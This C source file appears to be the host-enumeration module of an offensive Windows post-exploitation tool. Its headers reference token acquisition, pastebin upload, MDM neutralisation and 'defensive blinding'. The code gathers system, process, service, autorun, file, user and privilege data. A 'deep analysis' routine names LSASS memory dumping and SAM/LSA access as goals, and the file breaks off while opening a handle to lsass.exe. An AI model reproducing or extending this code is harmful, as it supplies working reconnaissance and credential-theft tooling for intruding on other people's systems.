// Windows 7 compatibility
#include "win7_compat.h"

#include "enumerator.h"
#include "token_acquisition.h"
#include "progress.h"
#include "pastebin.h"
#include "network_recursive.h"
#include "mdm_detection.h"
#include "mdm_neutralization.h"
#include "defensive_blinding.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>
#include <ctype.h>
#include <math.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <lm.h>
#include <winnetwk.h>
#include <psapi.h>
#include <icmpapi.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <wincrypt.h>
#include <dsgetdc.h>
#include <winldap.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "wldap32.lib")

// Forward declarations
int enumerate_system_info(enum_data_t* data);
int enumerate_hardware(enum_data_t* data);
int enumerate_processes(enum_data_t* data);
int enumerate_services(enum_data_t* data);
int enumerate_registry(enum_data_t* data);
int enumerate_filesystem(enum_data_t* data);
int enumerate_users(enum_data_t* data);
int enumerate_security(enum_data_t* data);
int enumerate_deep_analysis(enum_data_t* data);
int enumerate_network_interfaces(enum_data_t* data);
int enumerate_network_config(enum_data_t* data);
int enumerate_connections(enum_data_t* data);
int enumerate_network_discovery(enum_data_t* data);
int enumerate_wireless(enum_data_t* data);
int enumerate_vlan_structure(enum_data_t* data);

// Buffer management
void init_enum_data(enum_data_t* data) {
    data->buffer = (char*)malloc(MAX_BUFFER_SIZE);
    if (data->buffer) {
        data->buffer[0] = '\0';
        data->buffer_size = MAX_BUFFER_SIZE;
        data->buffer_used = 0;
    }
    memset(&data->token_result, 0, sizeof(token_result_t));
    data->has_system_token = false;
}

void free_enum_data(enum_data_t* data) {
    if (data->buffer) {
        free(data->buffer);
        data->buffer = NULL;
    }
}

void append_to_buffer(enum_data_t* data, const char* format, ...) {
    if (!data->buffer) {
        return;
    }
    
    va_list args;
    va_start(args, format);
    
    int remaining = data->buffer_size - data->buffer_used;
    if (remaining > 0) {
        int written = vsnprintf(data->buffer + data->buffer_used, remaining, format, args);
        if (written > 0 && written < remaining) {
            data->buffer_used += written;
        }
    }
    
    va_end(args);
}

// Main enumeration function
int enumerate_system(enum_data_t* data, progress_callback_t progress) {
    if (progress) progress(5, "System Information");
    enumerate_system_info(data);
    
    if (progress) progress(10, "Hardware Information");
    enumerate_hardware(data);
    
    if (progress) progress(20, "Process Enumeration");
    enumerate_processes(data);
    
    if (progress) progress(30, "Service Enumeration");
    enumerate_services(data);
    
    if (progress) progress(35, "Registry Enumeration");
    enumerate_registry(data);
    
    if (progress) progress(38, "File System Scan");
    enumerate_filesystem(data);
    
    if (progress) progress(40, "User/Group Enumeration");
    enumerate_users(data);
    
    if (progress) progress(42, "Security Information");
    enumerate_security(data);
    
    if (progress) progress(45, "Deep Analysis");
    enumerate_deep_analysis(data);
    
    return 0;
}

int enumerate_network(enum_data_t* data, progress_callback_t progress) {
    if (progress) progress(50, "Network Interfaces");
    enumerate_network_interfaces(data);
    
    if (progress) progress(60, "Network Configuration");
    enumerate_network_config(data);
    
    if (progress) progress(70, "Active Connections");
    enumerate_connections(data);
    
    if (progress) progress(75, "Network Discovery");
    enumerate_network_discovery(data);
    
    if (progress) progress(80, "Wireless Networks");
    enumerate_wireless(data);
    
    return 0;
}

int enumerate_vlan(enum_data_t* data, progress_callback_t progress) {
    if (progress) progress(85, "VLAN Structure");
    enumerate_vlan_structure(data);
    return 0;
}

// System information enumeration
int enumerate_system_info(enum_data_t* data) {
    append_to_buffer(data, "\n=== SYSTEM INFORMATION ===\n");
    
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    
    if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
        append_to_buffer(data, "OS Version: %lu.%lu\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
        append_to_buffer(data, "Build Number: %lu\n", osvi.dwBuildNumber);
        append_to_buffer(data, "Service Pack: %s\n", osvi.szCSDVersion);
        append_to_buffer(data, "Platform ID: %lu\n", osvi.dwPlatformId);
    }
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    append_to_buffer(data, "Processor Architecture: ");
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            append_to_buffer(data, "x64\n");
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            append_to_buffer(data, "x86\n");
            break;
        case PROCESSOR_ARCHITECTURE_ARM:
            append_to_buffer(data, "ARM\n");
            break;
        default:
            append_to_buffer(data, "Unknown\n");
    }
    append_to_buffer(data, "Number of Processors: %lu\n", si.dwNumberOfProcessors);
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        append_to_buffer(data, "Computer Name: %s\n", computerName);
    }
    
    char userName[256];
    size = sizeof(userName);
    if (GetUserNameA(userName, &size)) {
        append_to_buffer(data, "Current User: %s\n", userName);
    }
    
    // Uptime
    DWORD uptime = GetTickCount();
    append_to_buffer(data, "System Uptime: %lu ms (%lu hours)\n", uptime, uptime / 3600000);
    
    append_to_buffer(data, "==========================\n\n");
    return 0;
}

// Hardware enumeration using WMI
int enumerate_hardware(enum_data_t* data) {
    append_to_buffer(data, "\n=== HARDWARE INFORMATION ===\n");
    
    // Memory information
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        append_to_buffer(data, "Total RAM: %llu MB\n", memInfo.ullTotalPhys / (1024 * 1024));
        append_to_buffer(data, "Available RAM: %llu MB\n", memInfo.ullAvailPhys / (1024 * 1024));
        append_to_buffer(data, "Memory Load: %lu%%\n", memInfo.dwMemoryLoad);
    }
    
    // Disk drives - comprehensive enumeration
    DWORD drives = GetLogicalDrives();
    append_to_buffer(data, "Logical Drives:\n");
    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (drives & (1 << (drive - 'A'))) {
            ULARGE_INTEGER freeBytes, totalBytes;
            char rootPath[4] = {drive, ':', '\\', '\0'};
            if (GetDiskFreeSpaceExA(rootPath, &freeBytes, &totalBytes, NULL)) {
                DWORD sectorsPerCluster, bytesPerSector, freeClusters, totalClusters;
                char fsName[256] = {0};
                if (GetVolumeInformationA(rootPath, NULL, 0, NULL, NULL, NULL, fsName, sizeof(fsName))) {
                    append_to_buffer(data, "  Drive %c:\\\n", drive);
                    append_to_buffer(data, "    Total: %llu GB\n", totalBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL));
                    append_to_buffer(data, "    Free: %llu GB\n", freeBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL));
                    append_to_buffer(data, "    File System: %s\n", fsName);
                }
            }
        }
    }
    
    // CPU information via WMI
    HRESULT hres;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (SUCCEEDED(hres)) {
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (SUCCEEDED(hres)) {
            hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
            if (SUCCEEDED(hres)) {
                hres = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, 0, NULL, 0, 0, &pSvc);
                if (SUCCEEDED(hres)) {
                    hres = CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                    if (SUCCEEDED(hres)) {
                        // Query CPU information
                        IEnumWbemClassObject* pEnumerator = NULL;
                        hres = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", L"SELECT Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed FROM Win32_Processor", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                        if (SUCCEEDED(hres)) {
                            IWbemClassObject* pclsObj = NULL;
                            ULONG uReturn = 0;
                            while (pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn) == WBEM_S_NO_ERROR) {
                                VARIANT vtProp;
                                VariantInit(&vtProp);
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"Name", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    char cpuName[512];
                                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, cpuName, sizeof(cpuName), NULL, NULL);
                                    append_to_buffer(data, "CPU: %s\n", cpuName);
                                    VariantClear(&vtProp);
                                }
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"NumberOfCores", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    append_to_buffer(data, "Cores: %d\n", vtProp.uintVal);
                                    VariantClear(&vtProp);
                                }
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"NumberOfLogicalProcessors", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    append_to_buffer(data, "Logical Processors: %d\n", vtProp.uintVal);
                                    VariantClear(&vtProp);
                                }
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"MaxClockSpeed", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    append_to_buffer(data, "Max Clock Speed: %d MHz\n", vtProp.uintVal);
                                    VariantClear(&vtProp);
                                }
                                
                                pclsObj->lpVtbl->Release(pclsObj);
                            }
                            pEnumerator->lpVtbl->Release(pEnumerator);
                        }
                        
                        // Query BIOS information
                        IEnumWbemClassObject* pEnumBios = NULL;
                        hres = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", L"SELECT Manufacturer, Version, SerialNumber FROM Win32_BIOS", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumBios);
                        if (SUCCEEDED(hres)) {
                            IWbemClassObject* pclsObj = NULL;
                            ULONG uReturn = 0;
                            if (pEnumBios->lpVtbl->Next(pEnumBios, WBEM_INFINITE, 1, &pclsObj, &uReturn) == WBEM_S_NO_ERROR) {
                                VARIANT vtProp;
                                VariantInit(&vtProp);
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"Manufacturer", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    char biosMan[256];
                                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, biosMan, sizeof(biosMan), NULL, NULL);
                                    append_to_buffer(data, "BIOS Manufacturer: %s\n", biosMan);
                                    VariantClear(&vtProp);
                                }
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"Version", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    char biosVer[256];
                                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, biosVer, sizeof(biosVer), NULL, NULL);
                                    append_to_buffer(data, "BIOS Version: %s\n", biosVer);
                                    VariantClear(&vtProp);
                                }
                                
                                pclsObj->lpVtbl->Release(pclsObj);
                            }
                            pEnumBios->lpVtbl->Release(pEnumBios);
                        }
                        
                        pSvc->lpVtbl->Release(pSvc);
                    }
                }
                pLoc->lpVtbl->Release(pLoc);
            }
        }
        CoUninitialize();
    }
    
    append_to_buffer(data, "============================\n\n");
    return 0;
}

// Process enumeration with command line extraction
int enumerate_processes(enum_data_t* data) {
    append_to_buffer(data, "\n=== PROCESS INFORMATION ===\n");
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        append_to_buffer(data, "Failed to create process snapshot\n");
        return -1;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    int count = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (count < 200) {  // Increased limit for comprehensive enumeration
                append_to_buffer(data, "PID: %lu, Name: %s", pe32.th32ProcessID, pe32.szExeFile);
                
                // Get process command line via WMI (only for first 50 processes to avoid performance issues)
                if (count < 50) {
                    static IWbemServices* pSvcStatic = NULL;
                    static bool wmiInitialized = false;
                    
                    if (!wmiInitialized) {
                        HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
                        if (SUCCEEDED(hres)) {
                            hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
                            if (SUCCEEDED(hres)) {
                                IWbemLocator* pLoc = NULL;
                                hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
                                if (SUCCEEDED(hres)) {
                                    hres = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, 0, NULL, 0, 0, &pSvcStatic);
                                    if (SUCCEEDED(hres)) {
                                        CoSetProxyBlanket((IUnknown*)pSvcStatic, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                                        wmiInitialized = true;
                                    }
                                    pLoc->lpVtbl->Release(pLoc);
                                }
                            }
                        }
                    }
                    
                    if (wmiInitialized && pSvcStatic) {
                        char cmdLine[4096] = {0};
                        wchar_t query[512];
                        swprintf(query, sizeof(query)/sizeof(wchar_t), L"SELECT CommandLine FROM Win32_Process WHERE ProcessId = %lu", pe32.th32ProcessID);
                        IEnumWbemClassObject* pEnumerator = NULL;
                        HRESULT hres = pSvcStatic->lpVtbl->ExecQuery(pSvcStatic, L"WQL", query, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                        if (SUCCEEDED(hres)) {
                            IWbemClassObject* pclsObj = NULL;
                            ULONG uReturn = 0;
                            if (pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn) == WBEM_S_NO_ERROR) {
                                VARIANT vtProp;
                                VariantInit(&vtProp);
                                if (pclsObj->lpVtbl->Get(pclsObj, L"CommandLine", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    if (vtProp.vt == VT_BSTR && vtProp.bstrVal) {
                                        WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, cmdLine, sizeof(cmdLine), NULL, NULL);
                                        append_to_buffer(data, ", CMD: %s", cmdLine);
                                    }
                                    VariantClear(&vtProp);
                                }
                                pclsObj->lpVtbl->Release(pclsObj);
                            }
                            pEnumerator->lpVtbl->Release(pEnumerator);
                        }
                    }
                }
                
                // Get parent process ID
                append_to_buffer(data, ", PPID: %lu", pe32.th32ParentProcessID);
                
                // Get memory usage using GetProcessMemoryInfo
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    PROCESS_MEMORY_COUNTERS_EX pmc;
                    if (GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc))) {
                        append_to_buffer(data, ", Memory: %llu KB", pmc.WorkingSetSize / 1024);
                    }
                    CloseHandle(hProcess);
                }
                append_to_buffer(data, "\n");
            }
            count++;
        } while (Process32Next(hSnapshot, &pe32));
        append_to_buffer(data, "Total Processes: %d\n", count);
    }
    
    CloseHandle(hSnapshot);
    append_to_buffer(data, "===========================\n\n");
    return 0;
}

// Service enumeration
int enumerate_services(enum_data_t* data) {
    append_to_buffer(data, "\n=== SERVICE INFORMATION ===\n");
    
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCManager) {
        append_to_buffer(data, "Failed to open Service Control Manager\n");
        return -1;
    }
    
    DWORD dwBytesNeeded = 0;
    DWORD dwServicesReturned = 0;
    DWORD dwResumedHandle = 0;
    EnumServicesStatusEx(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_TYPE_ALL, SERVICE_STATE_ALL,
        NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumedHandle, NULL);
    
    if (dwBytesNeeded > 0) {
        LPENUM_SERVICE_STATUS_PROCESS lpServices = (LPENUM_SERVICE_STATUS_PROCESS)malloc(dwBytesNeeded);
        if (lpServices) {
            if (EnumServicesStatusEx(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_TYPE_ALL, SERVICE_STATE_ALL,
                (LPBYTE)lpServices, dwBytesNeeded, &dwBytesNeeded, &dwServicesReturned, &dwResumedHandle, NULL)) {
                
                for (DWORD i = 0; i < dwServicesReturned && i < 100; i++) {
                    append_to_buffer(data, "Service: %s, Display: %s, State: %s, PID: %lu\n",
                        lpServices[i].lpServiceName,
                        lpServices[i].lpDisplayName,
                        lpServices[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped",
                        lpServices[i].ServiceStatusProcess.dwProcessId);
                }
                append_to_buffer(data, "Total Services: %lu\n", dwServicesReturned);
            }
            free(lpServices);
        }
    }
    
    CloseServiceHandle(hSCManager);
    append_to_buffer(data, "==========================\n\n");
    return 0;
}

// Registry enumeration - comprehensive auto-start locations
int enumerate_registry(enum_data_t* data) {
    append_to_buffer(data, "\n=== REGISTRY ENUMERATION ===\n");
    
    // Auto-start registry keys to enumerate
    const char* autoStartKeys[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"
    };
    
    const char* keyNames[] = {
        "Run (HKLM)",
        "RunOnce (HKLM)",
        "RunOnceEx (HKLM)",
        "Run (HKLM Wow6432Node)",
        "RunOnce (HKLM Wow6432Node)",
        "Policies\\Explorer\\Run (HKLM)",
        "Winlogon\\Userinit",
        "Winlogon\\Shell"
    };
    
    for (int keyIdx = 0; keyIdx < 8; keyIdx++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, autoStartKeys[keyIdx], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            append_to_buffer(data, "Auto-start Programs (%s):\n", keyNames[keyIdx]);
            char valueName[256];
            char valueData[2048];
            DWORD valueNameSize, valueDataSize, valueType;
            DWORD index = 0;
            
            while (index < 100) {
                valueNameSize = sizeof(valueName);
                valueDataSize = sizeof(valueData);
                LONG result = RegEnumValueA(hKey, index++, valueName, &valueNameSize, NULL, &valueType, (LPBYTE)valueData, &valueDataSize);
                if (result == ERROR_SUCCESS) {
                    valueData[valueDataSize] = '\0';
                    append_to_buffer(data, "  %s = %s\n", valueName, valueData);
                } else if (result == ERROR_NO_MORE_ITEMS) {
                    break;
                } else {
                    break;
                }
            }
            RegCloseKey(hKey);
        }
    }
    
    // Current user auto-start
    HKEY hKeyUser;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKeyUser) == ERROR_SUCCESS) {
        append_to_buffer(data, "Auto-start Programs (HKCU Run):\n");
        char valueName[256];
        char valueData[2048];
        DWORD valueNameSize, valueDataSize, valueType;
        DWORD index = 0;
        
        while (index < 100) {
            valueNameSize = sizeof(valueName);
            valueDataSize = sizeof(valueData);
            if (RegEnumValueA(hKeyUser, index++, valueName, &valueNameSize, NULL, &valueType, (LPBYTE)valueData, &valueDataSize) == ERROR_SUCCESS) {
                valueData[valueDataSize] = '\0';
                append_to_buffer(data, "  %s = %s\n", valueName, valueData);
            } else {
                break;
            }
        }
        RegCloseKey(hKeyUser);
    }
    
    // Installed software enumeration
    HKEY hKeyUninstall;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKeyUninstall) == ERROR_SUCCESS) {
        append_to_buffer(data, "Installed Software (sample):\n");
        char subKeyName[256];
        DWORD subKeyIndex = 0;
        DWORD subKeyNameSize;
        
        while (subKeyIndex < 50) {
            subKeyNameSize = sizeof(subKeyName);
            if (RegEnumKeyExA(hKeyUninstall, subKeyIndex++, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY hSubKey;
                if (RegOpenKeyExA(hKeyUninstall, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char displayName[512];
                    DWORD displayNameSize = sizeof(displayName);
                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
                        append_to_buffer(data, "  %s\n", displayName);
                    }
                    RegCloseKey(hSubKey);
                }
            } else {
                break;
            }
        }
        RegCloseKey(hKeyUninstall);
    }
    
    append_to_buffer(data, "===========================\n\n");
    return 0;
}

// File system enumeration - comprehensive directory scanning
int enumerate_filesystem(enum_data_t* data) {
    append_to_buffer(data, "\n=== FILE SYSTEM INFORMATION ===\n");
    
    // Comprehensive directory enumeration
    const char* importantDirs[] = {
        "C:\\Program Files",
        "C:\\Program Files (x86)",
        "C:\\Windows\\System32",
        "C:\\Windows\\SysWOW64",
        "C:\\Windows\\Temp",
        "C:\\Users",
        "C:\\ProgramData",
        "C:\\Windows\\Prefetch",
        "C:\\Windows\\Logs",
        "C:\\PerfLogs"
    };
    
    for (int i = 0; i < 10; i++) {
        WIN32_FIND_DATAA findData;
        char searchPath[MAX_PATH];
        snprintf(searchPath, sizeof(searchPath), "%s\\*", importantDirs[i]);
        
        HANDLE hFind = FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            append_to_buffer(data, "Directory: %s\n", importantDirs[i]);
            int count = 0;
            do {
                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    if (count < 30) {
                        char fullPath[MAX_PATH];
                        snprintf(fullPath, sizeof(fullPath), "%s\\%s", importantDirs[i], findData.cFileName);
                        append_to_buffer(data, "  %s", findData.cFileName);
                        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                            append_to_buffer(data, " [DIR]");
                        } else {
                            append_to_buffer(data, " [FILE] %llu bytes", ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow);
                        }
                        append_to_buffer(data, "\n");
                    }
                    count++;
                }
            } while (FindNextFileA(hFind, &findData) && count < 30);
            append_to_buffer(data, "  Total entries: %d\n", count);
            FindClose(hFind);
        }
    }
    
    // Startup folders
    const char* startupFolders[] = {
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    };
    
    append_to_buffer(data, "Startup Folders:\n");
    for (int i = 0; i < 2; i++) {
        WIN32_FIND_DATAA findData;
        char searchPath[MAX_PATH];
        char expandedPath[MAX_PATH];
        ExpandEnvironmentStringsA(startupFolders[i], expandedPath, sizeof(expandedPath));
        snprintf(searchPath, sizeof(searchPath), "%s\\*", expandedPath);
        
        HANDLE hFind = FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            append_to_buffer(data, "  %s:\n", expandedPath);
            do {
                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    append_to_buffer(data, "    %s\n", findData.cFileName);
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    append_to_buffer(data, "===============================\n\n");
    return 0;
}

// User enumeration using NetUserEnum
int enumerate_users(enum_data_t* data) {
    append_to_buffer(data, "\n=== USER INFORMATION ===\n");
    
    // Get current user info
    char userName[256];
    DWORD size = sizeof(userName);
    if (GetUserNameA(userName, &size)) {
        append_to_buffer(data, "Current User: %s\n", userName);
    }
    
    // Enumerate local users using NetUserEnum
    LPUSER_INFO_0 pBuf = NULL;
    LPUSER_INFO_0 pTmpBuf = NULL;
    DWORD dwLevel = 0;
    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    NET_API_STATUS nStatus;
    
    nStatus = NetUserEnum(NULL, dwLevel, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
    
    if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
        if ((pTmpBuf = pBuf) != NULL) {
            append_to_buffer(data, "Local Users:\n");
            for (DWORD i = 0; i < dwEntriesRead; i++) {
                if (pTmpBuf[i].usri0_name != NULL) {
                    char user[256];
                    WideCharToMultiByte(CP_UTF8, 0, pTmpBuf[i].usri0_name, -1, user, sizeof(user), NULL, NULL);
                    append_to_buffer(data, "  %s\n", user);
                }
            }
            append_to_buffer(data, "Total Users: %lu\n", dwTotalEntries);
        }
    } else {
        append_to_buffer(data, "NetUserEnum failed: %lu\n", nStatus);
    }
    
    if (pBuf != NULL) {
        NetApiBufferFree(pBuf);
    }
    
    // Enumerate local groups
    LPLOCALGROUP_INFO_0 pGroupBuf = NULL;
    DWORD dwGroupEntriesRead = 0;
    DWORD dwGroupTotalEntries = 0;
    
    nStatus = NetLocalGroupEnum(NULL, 0, (LPBYTE*)&pGroupBuf, MAX_PREFERRED_LENGTH, &dwGroupEntriesRead, &dwGroupTotalEntries, NULL);
    
    if (nStatus == NERR_Success) {
        if (pGroupBuf != NULL) {
            append_to_buffer(data, "Local Groups:\n");
            for (DWORD i = 0; i < dwGroupEntriesRead; i++) {
                if (pGroupBuf[i].lgrpi0_name != NULL) {
                    char group[256];
                    WideCharToMultiByte(CP_UTF8, 0, pGroupBuf[i].lgrpi0_name, -1, group, sizeof(group), NULL, NULL);
                    append_to_buffer(data, "  %s\n", group);
                }
            }
            append_to_buffer(data, "Total Groups: %lu\n", dwGroupTotalEntries);
        }
    }
    
    if (pGroupBuf != NULL) {
        NetApiBufferFree(pGroupBuf);
    }
    
    append_to_buffer(data, "=======================\n\n");
    return 0;
}

// Security enumeration
int enumerate_security(enum_data_t* data) {
    append_to_buffer(data, "\n=== SECURITY INFORMATION ===\n");
    
    // Check if running as admin
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    append_to_buffer(data, "Running as Administrator: %s\n", isAdmin ? "Yes" : "No");
    
    append_to_buffer(data, "===========================\n\n");
    return 0;
}

// Deep analysis (requires SYSTEM token)
int enumerate_deep_analysis(enum_data_t* data) {
    append_to_buffer(data, "\n=== DEEP ANALYSIS ===\n");
    
    if (!data->has_system_token) {
        append_to_buffer(data, "SYSTEM token not available - skipping deep analysis\n");
        append_to_buffer(data, "Deep analysis requires SYSTEM privileges for:\n");
        append_to_buffer(data, "  - LSASS memory dump\n");
        append_to_buffer(data, "  - Protected registry keys (SAM, LSA)\n");
        append_to_buffer(data, "  - Kernel-level information\n");
        append_to_buffer(data, "========================\n\n");
        return 0;
    }
    
    append_to_buffer(data, "SYSTEM token available - performing deep analysis...\n");
    
    // Try to access LSASS
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) {
                    lsassPid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    if (lsassPid > 0) {
        append_to_buffer(data, "LSASS Process ID: %lu\n", lsassPid);
        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
